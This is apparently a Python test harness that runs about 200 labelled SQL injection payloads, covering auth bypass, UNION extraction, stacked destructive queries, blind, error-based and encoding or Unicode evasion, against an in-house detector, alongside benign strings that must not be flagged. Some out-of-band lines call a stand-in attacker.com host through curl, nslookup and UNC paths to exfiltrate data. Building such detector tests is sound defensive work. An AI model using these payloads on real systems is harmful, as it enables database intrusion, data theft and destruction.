"""
Round 3 — Exhaustive bypass attempts (200+ payloads).
Every known SQLi technique from SQLMap, PayloadsAllTheThings, OWASP, HackTricks,
plus novel evasion ideas targeting the specific architecture of this detector.
"""
import os, sys, time
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from sql_injection_detector import SQLInjectionEnsemble
detector = SQLInjectionEnsemble()

# T = should block, F = must NOT block
T, F = True, False

TESTS = {
# ═══════════════════════════════════════════════════════════════
# 1. AUTHENTICATION BYPASS (login forms)
# ═══════════════════════════════════════════════════════════════
"1. AUTH BYPASS": [
    ("admin'--", "classic admin comment", T),
    ("admin'#", "admin hash comment", T),
    ("admin'/*", "admin block comment", T),
    ("' OR 1=1--", "classic OR tautology", T),
    ("' OR '1'='1'--", "string tautology", T),
    ("' OR ''='", "empty string tautology", T),
    ("') OR ('1'='1", "paren-wrapped OR", T),
    ("') OR ('1'='1'--", "paren OR with comment", T),
    ("' OR 1=1 LIMIT 1--", "OR + LIMIT", T),
    ("' OR 1=1 LIMIT 1 OFFSET 1--", "OR + LIMIT OFFSET", T),
    ("admin' OR 1=1#", "admin OR hash", T),
    ("admin') OR ('1'='1", "admin paren OR", T),
    ("' UNION SELECT 'admin','password'--", "UNION login bypass", T),
    ("' OR 1 IN (1)--", "IN tautology", T),
    ("' OR 1 BETWEEN 0 AND 2--", "BETWEEN tautology", T),
    ("' OR 'x' LIKE '%'--", "LIKE wildcard", T),
    ("' OR 'x' LIKE 'x'--", "LIKE exact match", T),
    ("' OR 2 > 1--", "greater than tautology", T),
    ("' OR 2 != 3--", "not-equal tautology", T),
    ("' OR NOT 0--", "NOT 0 tautology", T),
    ("' OR 1 IS NOT NULL--", "IS NOT NULL", T),
    ("'=' '", "equals obfuscation", T),
    ("'=0#", "equals zero hash", T),
    ("' OR username IS NOT NULL--", "column IS NOT NULL", T),
],

# ═══════════════════════════════════════════════════════════════
# 2. UNION-BASED EXTRACTION
# ═══════════════════════════════════════════════════════════════
"2. UNION EXTRACTION": [
    ("' UNION SELECT NULL--", "UNION NULL single", T),
    ("' UNION SELECT NULL,NULL--", "UNION NULL double", T),
    ("' UNION SELECT NULL,NULL,NULL--", "UNION NULL triple", T),
    ("' UNION ALL SELECT 1,2,3--", "UNION ALL", T),
    ("' UNION SELECT username,password FROM users--", "UNION data exfil", T),
    ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "info_schema tables", T),
    ("' UNION SELECT column_name,NULL FROM information_schema.columns--", "info_schema columns", T),
    ("' UNION SELECT GROUP_CONCAT(username) FROM users--", "GROUP_CONCAT exfil", T),
    ("' UNION SELECT @@version--", "UNION version", T),
    ("' UNION SELECT LOAD_FILE('/etc/passwd')--", "UNION LOAD_FILE", T),
    ("1 UNION SELECT 1,2,3--", "numeric UNION", T),
    ("-1 UNION SELECT 1,2,3--", "negative UNION", T),
    ("0 UNION ALL SELECT 1,2,3,4--", "zero UNION ALL", T),
    ("' UNION SELECT 1,CONCAT(username,':',password) FROM users--", "UNION CONCAT exfil", T),
],

# ═══════════════════════════════════════════════════════════════
# 3. STACKED QUERIES
# ═══════════════════════════════════════════════════════════════
"3. STACKED QUERIES": [
    ("'; DROP TABLE users--", "DROP TABLE", T),
    ("'; DROP TABLE IF EXISTS users--", "DROP IF EXISTS", T),
    ("'; DELETE FROM users--", "DELETE FROM", T),
    ("'; DELETE FROM users WHERE 1=1--", "DELETE all rows", T),
    ("'; INSERT INTO users VALUES('hacker','pass')--", "INSERT user", T),
    ("'; UPDATE users SET password='hacked'--", "UPDATE password", T),
    ("'; UPDATE users SET role='admin' WHERE username='hacker'--", "UPDATE role", T),
    ("'; TRUNCATE TABLE users--", "TRUNCATE", T),
    ("'; CREATE TABLE hacked(id INT)--", "CREATE TABLE", T),
    ("'; ALTER TABLE users ADD backdoor VARCHAR(100)--", "ALTER TABLE", T),
    ("'; EXEC xp_cmdshell('whoami')--", "xp_cmdshell", T),
    ("'; EXEC sp_configure 'show advanced options',1--", "sp_configure", T),
    ("'; SHUTDOWN--", "SHUTDOWN", T),
    ("'; GRANT ALL ON *.* TO 'hacker'@'%'--", "GRANT ALL", T),
    ("1; SELECT pg_sleep(5)--", "PG stacked sleep", T),
    ("1; WAITFOR DELAY '0:0:5'--", "MSSQL WAITFOR stacked", T),
],

# ═══════════════════════════════════════════════════════════════
# 4. TIME-BASED BLIND
# ═══════════════════════════════════════════════════════════════
"4. TIME-BASED BLIND": [
    ("' AND SLEEP(5)--", "MySQL SLEEP", T),
    ("' AND SLEEP(5)#", "MySQL SLEEP hash", T),
    ("' OR SLEEP(5)--", "OR SLEEP", T),
    ("' AND BENCHMARK(10000000,SHA1('test'))--", "BENCHMARK SHA1", T),
    ("' AND BENCHMARK(5000000,MD5('test'))--", "BENCHMARK MD5", T),
    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL WAITFOR", T),
    ("' AND (SELECT * FROM (SELECT SLEEP(5))a)--", "subquery SLEEP", T),
    ("' OR (SELECT SLEEP(5) FROM dual)--", "Oracle-style dual SLEEP", T),
    ("' AND pg_sleep(5)--", "PG pg_sleep", T),
    ("' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PG_SLEEP subquery", T),
    ("' AND IF(1=1,SLEEP(5),0)--", "IF SLEEP", T),
    ("' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--", "CASE WHEN SLEEP", T),
    ("' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)>0--", "heavy query DoS", T),
],

# ═══════════════════════════════════════════════════════════════
# 5. BOOLEAN-BASED BLIND
# ═══════════════════════════════════════════════════════════════
"5. BOOLEAN BLIND": [
    ("' AND 1=1--", "AND true", T),
    ("' AND 1=2--", "AND false (probe)", T),
    ("' AND SUBSTRING(username,1,1)='a'--", "SUBSTRING blind", T),
    ("' AND ASCII(SUBSTRING(username,1,1))>65--", "ASCII SUBSTRING", T),
    ("' AND LENGTH(password)>5--", "LENGTH blind", T),
    ("' AND (SELECT COUNT(*) FROM users)>0--", "COUNT blind", T),
    ("' AND (SELECT TOP 1 username FROM users)='admin'--", "TOP 1 blind", T),
    ("' AND MID(username,1,1)='a'--", "MID blind", T),
    ("' AND LEFT(username,1)='a'--", "LEFT blind", T),
    ("' AND username LIKE 'a%'--", "LIKE blind", T),
    ("' AND username REGEXP '^a'--", "REGEXP blind", T),
    ("' AND username RLIKE '^admin'--", "RLIKE blind", T),
    ("' AND EXISTS(SELECT * FROM users WHERE username='admin')--", "EXISTS blind", T),
    ("' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)='1", "CASE error blind", T),
    ("' AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM users LIMIT 0,1),1,1))>64--", "deep blind chain", T),
],

# ═══════════════════════════════════════════════════════════════
# 6. ERROR-BASED
# ═══════════════════════════════════════════════════════════════
"6. ERROR-BASED": [
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "EXTRACTVALUE", T),
    ("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "UPDATEXML", T),
    ("' AND EXP(~(SELECT * FROM (SELECT @@version)a))--", "EXP overflow", T),
    ("' AND GTID_SUBSET(CONCAT(0x7e,VERSION()),0)--", "GTID_SUBSET", T),
    ("' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))--", "JSON_KEYS", T),
    ("' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)--", "double query", T),
    ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "error double query v2", T),
    ("' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL CONVERT error", T),
    ("' AND 1=CAST((SELECT @@version) AS int)--", "MSSQL CAST error", T),
],

# ═══════════════════════════════════════════════════════════════
# 7. OUT-OF-BAND (OOB) / DATA EXFILTRATION
# ═══════════════════════════════════════════════════════════════
"7. OOB EXFIL": [
    ("' UNION SELECT LOAD_FILE('/etc/passwd')--", "LOAD_FILE /etc/passwd", T),
    ("' INTO OUTFILE '/tmp/dump.txt'--", "INTO OUTFILE", T),
    ("' INTO DUMPFILE '/tmp/shell.php'--", "INTO DUMPFILE", T),
    ("'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--", "xp_dirtree UNC", T),
    ("'; EXEC master..xp_cmdshell 'nslookup attacker.com'--", "xp_cmdshell DNS", T),
    ("' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual)--", "Oracle UTL_INADDR", T),
    ("' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||VERSION()) FROM dual)--", "Oracle UTL_HTTP", T),
    ("'; COPY users TO '/tmp/users.csv' WITH CSV--", "PG COPY TO", T),
    ("'; COPY (SELECT * FROM users) TO PROGRAM 'curl http://attacker.com'--", "PG COPY PROGRAM", T),
],

# ═══════════════════════════════════════════════════════════════
# 8. ADVANCED OBFUSCATION — comments
# ═══════════════════════════════════════════════════════════════
"8. COMMENT OBFUSCATION": [
    ("'/**/OR/**/1=1--", "/**/ separated OR", T),
    ("'/**/UNION/**/SELECT/**/1,2,3--", "/**/ separated UNION", T),
    ("UN/**/ION SE/**/LECT 1,2,3--", "split keywords /**/ ", T),
    ("DR/**/OP TA/**/BLE users--", "split DROP TABLE", T),
    ("SE/**/LECT * FR/**/OM users--", "split SELECT FROM --", T),
    ("' /*!UNION*/ /*!SELECT*/ 1,2,3--", "MySQL conditional", T),
    ("' /*!50000UNION*/ /*!50000SELECT*/ 1,2--", "MySQL version conditional", T),
    ("SELECT/**/username/**/FROM/**/users", "/**/ as space in query", T),
    ("' OR/**/ 1=1--", "comment in OR pattern", T),
    ("'/*! OR 1=1*/--", "MySQL conditional OR", T),
],

# ═══════════════════════════════════════════════════════════════
# 9. ADVANCED OBFUSCATION — case / whitespace
# ═══════════════════════════════════════════════════════════════
"9. CASE + WHITESPACE": [
    ("' oR 1=1--", "mixed case OR", T),
    ("' UnIoN SeLeCt 1,2,3--", "alternating case UNION", T),
    ("' uNiOn aLl sElEcT 1,2--", "alt case UNION ALL", T),
    ("'\tOR\t1=1--", "tab-separated OR", T),
    ("'\nOR\n1=1--", "newline-separated OR", T),
    ("'\r\nOR\r\n1=1--", "CRLF-separated OR", T),
    ("' OR\t\t1=1--", "multi-tab OR", T),
    ("'\x0bOR\x0b1=1--", "vertical tab OR", T),
    ("'\x0cOR\x0c1=1--", "form feed OR", T),
    ("'\xa0OR\xa01=1--", "NBSP OR", T),
],

# ═══════════════════════════════════════════════════════════════
# 10. ENCODING BYPASS
# ═══════════════════════════════════════════════════════════════
"10. ENCODING": [
    ("%27%20OR%201=1--", "URL encoded single", T),
    ("%27%20UNION%20SELECT%201,2,3--", "URL encoded UNION", T),
    ("%2527%2520OR%25201=1--", "double URL encode", T),
    ("&#39; OR 1=1--", "HTML entity &#39;", T),
    ("&#x27; OR 1=1--", "HTML hex &#x27;", T),
    ("' OR CHAR(49)=CHAR(49)--", "CHAR() comparison", T),
    ("' OR 0x31=0x31--", "hex comparison", T),
    ("' UNION SELECT CHAR(97,100,109,105,110)--", "CHAR() string", T),
    ("' OR CONCAT(CHAR(49))=CHAR(49)--", "CONCAT CHAR", T),
],

# ═══════════════════════════════════════════════════════════════
# 11. UNICODE BYPASS
# ═══════════════════════════════════════════════════════════════
"11. UNICODE": [
    # Zero-width chars
    ("SEL\u200bECT * FR\u200bOM users--", "zero-width space in KW", T),
    ("UNI\u200cON SEL\u200cECT 1,2--", "ZWNJ in keywords", T),
    ("DR\ufeffOP TABLE users--", "BOM in DROP", T),
    # Fullwidth
    ("\uff27' OR '1'='1", "fullwidth G + injection", T),
    # Smart quotes
    ("\u2018 OR 1=1--", "left smart quote", T),
    ("\u2019 OR 1=1--", "right smart quote", T),
    # Diacritics
    ("S\u0300ELECT * FROM users--", "diacritic S + --", T),
    # Math styled
    ("\U0001d412\U0001d404\U0001d40b\U0001d404\U0001d402\U0001d413 * FROM users--", "math bold SELECT --", T),
    # Homoglyphs — Cyrillic
    ("' \u041eR 1=1--", "Cyrillic O in OR", T),
    # Combining above + below
    ("U\u0308NION SELECT 1,2,3--", "combining diaeresis on U", T),
],

# ═══════════════════════════════════════════════════════════════
# 12. DATABASE-SPECIFIC ATTACKS
# ═══════════════════════════════════════════════════════════════
"12. DB-SPECIFIC": [
    # MySQL
    ("' OR 1=1-- -", "MySQL -- - comment", T),
    ("' OR 1=1 /*!OR 1=1*/--", "MySQL conditional OR", T),
    ("' UNION SELECT @@hostname,@@datadir--", "MySQL system vars", T),
    # PostgreSQL
    ("'; SELECT current_database()--", "PG current_database", T),
    ("' OR 1::int=1--", "PG type cast", T),
    ("'; SELECT string_agg(tablename,',') FROM pg_tables--", "PG pg_tables enum", T),
    # MSSQL
    ("' UNION SELECT name FROM sysobjects WHERE xtype='U'--", "MSSQL sysobjects", T),
    ("'; EXEC master.dbo.xp_cmdshell 'dir'--", "MSSQL xp_cmdshell full", T),
    ("' AND @@servername IS NOT NULL--", "MSSQL servername", T),
    # Oracle
    ("' UNION SELECT banner FROM v$version--", "Oracle v$version", T),
    ("' AND (SELECT UTL_INADDR.GET_HOST_NAME('127.0.0.1') FROM dual) IS NOT NULL--", "Oracle GET_HOST_NAME", T),
    ("' UNION SELECT NULL FROM dual--", "Oracle dual", T),
    # SQLite
    ("' UNION SELECT sql FROM sqlite_master--", "SQLite sqlite_master", T),
    ("' UNION SELECT name FROM sqlite_master WHERE type='table'--", "SQLite table enum", T),
],

# ═══════════════════════════════════════════════════════════════
# 13. WAF BYPASS — ADVANCED
# ═══════════════════════════════════════════════════════════════
"13. WAF BYPASS ADV": [
    ("'OR(1=1)--", "no-space paren OR", T),
    ("'AND(1=1)--", "no-space paren AND", T),
    ("'UNION(SELECT(1),(2),(3))--", "no-space UNION SELECT", T),
    ("'OR'1'='1", "no-space OR tautology", T),
    ("' OR 'a'+'b'='ab'--", "MSSQL concat tautology", T),
    ("' OR 'a'||'a'='aa'--", "PG/Oracle concat tautology", T),
    ("' OR 1e0=1e0--", "scientific notation", T),
    ("' OR 1.0=1.0--", "float tautology", T),
    ("' OR 1&1--", "bitwise AND", T),
    ("' OR 1|0--", "bitwise OR", T),
    ("' OR ~~1--", "double bitwise NOT", T),
    ("' OR 1 XOR 0--", "XOR tautology", T),
    ("' OR 1 DIV 1--", "DIV tautology", T),
    # Backtick as delimiter
    ("` OR 1=1-- ", "backtick delimiter", T),
    # Percent wildcard in LIKE
    ("' OR username LIKE '%", "LIKE percent wildcard", T),
    # Hex function
    ("' OR HEX(1)=HEX(1)--", "HEX comparison", T),
],

# ═══════════════════════════════════════════════════════════════
# 14. SECOND-ORDER / STORED / INDIRECT
# ═══════════════════════════════════════════════════════════════
"14. SECOND-ORDER": [
    ("admin' OR '1'='1", "stored OR in field", T),
    ("John'; DROP TABLE users;--", "stacked in name", T),
    ("Robert'); DROP TABLE students;--", "Bobby Tables classic", T),
    ('{"user":"admin\' OR 1=1--"}', "JSON-wrapped injection", T),
    ("test@test.com' OR 1=1--", "email field injection", T),
    ("<script>alert('XSS')</script>' OR 1=1--", "XSS+SQLi combo", T),
    ("' UNION SELECT * FROM users WHERE '1'='1", "UNION balanced quotes", T),
    ("admin'-- ", "admin truncation trailing space", T),
],

# ═══════════════════════════════════════════════════════════════
# 15. POLYGLOT PAYLOADS (work across multiple contexts)
# ═══════════════════════════════════════════════════════════════
"15. POLYGLOT": [
    ("SLEEP(1)/*' OR SLEEP(1) OR '\" OR SLEEP(1) OR \"*/", "polyglot SLEEP multi-context", T),
    ("'\"-- /**/OR 1=1 --;/**/", "polyglot mixed delimiters", T),
    ("'-''-- \" OR 1=1--", "polyglot dash-quote", T),
    ("IF(1=1,1,0)-- -", "IF tautology comment", T),
    ("' AND 1=1 UNION SELECT NULL--", "AND+UNION combo", T),
    ("1' AND '1'='1' UNION SELECT NULL--", "balanced AND+UNION", T),
    ("-1' UNION SELECT 1,2,3--", "negative+quote UNION", T),
],

# ═══════════════════════════════════════════════════════════════
# 16. SCHEMA ENUMERATION / RECON
# ═══════════════════════════════════════════════════════════════
"16. SCHEMA ENUM": [
    ("' ORDER BY 1--", "ORDER BY 1", T),
    ("' ORDER BY 10--", "ORDER BY 10", T),
    ("' ORDER BY 100--", "ORDER BY 100 (col count)", T),
    ("' GROUP BY 1--", "GROUP BY 1", T),
    ("' HAVING 1=1--", "HAVING tautology", T),
    ("' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--", "current DB tables", T),
    ("' AND (SELECT LENGTH(database()))>0--", "database length probe", T),
    ("' AND (SELECT SUBSTRING(database(),1,1))='a'--", "database char probe", T),
],

# ═══════════════════════════════════════════════════════════════
# 17. FALSE POSITIVES — MUST NOT BLOCK
# ═══════════════════════════════════════════════════════════════
"17. FALSE POSITIVES": [
    ("John O'Brien", "Irish name", F),
    ("McDonald's", "brand apostrophe", F),
    ("D'Angelo's Pizzeria", "Italian name + possessive", F),
    ("It's a beautiful day", "contraction", F),
    ("Don't worry about it", "contraction 2", F),
    ("children's toys are fun", "possessive", F),
    ("Rock 'n' Roll forever", "rock n roll", F),
    ("The table is set for dinner", "table as furniture", F),
    ("Please select your options", "select as verb", F),
    ("Drop me a line anytime", "drop as verb", F),
    ("Let's update the records", "update as verb", F),
    ("Delete old photos from gallery", "delete as verb", F),
    ("Join our union today", "union as org", F),
    ("Insert coin to continue", "insert as verb", F),
    ("The order was placed yesterday", "order as noun", F),
    ("user@example.com", "email", F),
    ("192.168.1.100", "IP address", F),
    ("2024-01-15 14:30:00", "datetime", F),
    ("+1-555-123-4567", "phone number", F),
    ("Price: $99.99 with 50% discount", "price", F),
    ("C++ programming language", "C++", F),
    ("Room 101 OR similar", "OR in room description", F),
    ("1=1 is a tautology in logic", "tautology in prose", F),
    ("The password1=1 is strong", "1=1 in password text", F),
    ("SELECT few items from the list", "SELECT in sentence", F),
    ("Union Station is a landmark", "Union as proper noun", F),
    ("The user's comment was deleted by admin", "deleted in text", F),
    ("Benchmark results show improvement", "benchmark as noun", F),
    ("Sleep 8 hours for better health", "sleep as noun", F),
    ("True or false: the earth is round", "or false question", F),
    ("Shaquille O'Neal played basketball", "O'Neal name", F),
    ("5 o'clock tea time", "o'clock", F),
    ("L'Oreal Paris cosmetics", "L'Oreal brand", F),
    ("She said 'hello' to everyone", "quoted word in text", F),
    ("Count the number of items in each set", "count + set in text", F),
    ("He said: 'I'll be back' and left", "nested quotes text", F),
    ("The European Union voted to select new representatives", "EU + select", F),
    ("If x = 1 then return true else false", "code pseudocode", F),
    ("Version 2.0 was released in 2024", "version as noun", F),
    ("Check if the value is null or empty", "null + or in text", F),
],
}


def run_category(name, payloads):
    passed = failed = 0
    fn_fails = []
    fp_fails = []
    for payload, desc, should_block in payloads:
        try:
            r = detector.detect(payload)
            act = r["action"]
            ok = (act in ("BLOCK", "ALERT")) if should_block else (act not in ("BLOCK", "ALERT"))
            if ok:
                passed += 1
            else:
                failed += 1
                entry = (payload, desc, r["decision"], act, r["score"], r.get("semantic_score", 0), r.get("rule", "?"))
                if should_block:
                    fn_fails.append(entry)
                else:
                    fp_fails.append(entry)
                tag = "MISS" if should_block else "FP"
                print(f"  !! [{tag:4s}] {desc:48s} | {r['decision']:12s} {act:10s} S={r['score']:.3f} sem={r.get('semantic_score',0)}")
        except Exception as e:
            failed += 1
            print(f"  !! [ERR ] {desc:48s} | {e}")
    return passed, failed, fn_fails, fp_fails


def main():
    print("=" * 110)
    print("ROUND 3 -- EXHAUSTIVE BYPASS TEST (200+ payloads)")
    print("=" * 110)

    total_p = total_f = 0
    all_fn = []
    all_fp = []
    cat_results = []

    start = time.time()
    for name, payloads in TESTS.items():
        print(f"\n--- {name} ({len(payloads)} tests) ---")
        p, f, fn, fp = run_category(name, payloads)
        total_p += p
        total_f += f
        all_fn.extend(fn)
        all_fp.extend(fp)
        cat_results.append((name, p, f, len(payloads)))
    elapsed = time.time() - start

    total = total_p + total_f
    print(f"\n{'=' * 110}")
    print(f"RESULTS: {total_p}/{total} passed ({100*total_p/total:.1f}%) in {elapsed:.1f}s")
    print(f"{'=' * 110}")
    print(f"\nPer-category:")
    for name, p, f, t in cat_results:
        s = "PASS" if f == 0 else "FAIL"
        print(f"  [{s:4s}] {name:48s}  {p}/{t} ({100*p/t:.0f}%)")

    if all_fn:
        print(f"\n{'=' * 110}")
        print(f"FALSE NEGATIVES ({len(all_fn)}) -- attacks that BYPASSED the detector:")
        print(f"{'=' * 110}")
        for payload, desc, dec, act, score, sem, rule in all_fn:
            print(f"  {desc:48s} | {dec}/{act} S={score:.3f} sem={sem} rule={rule}")
            print(f"    payload: {repr(payload[:100])}")

    if all_fp:
        print(f"\n{'=' * 110}")
        print(f"FALSE POSITIVES ({len(all_fp)}) -- safe inputs incorrectly BLOCKED:")
        print(f"{'=' * 110}")
        for payload, desc, dec, act, score, sem, rule in all_fp:
            print(f"  {desc:48s} | {dec}/{act} S={score:.3f} sem={sem} rule={rule}")
            print(f"    payload: {repr(payload[:100])}")

    return total_f

if __name__ == "__main__":
    sys.exit(main())
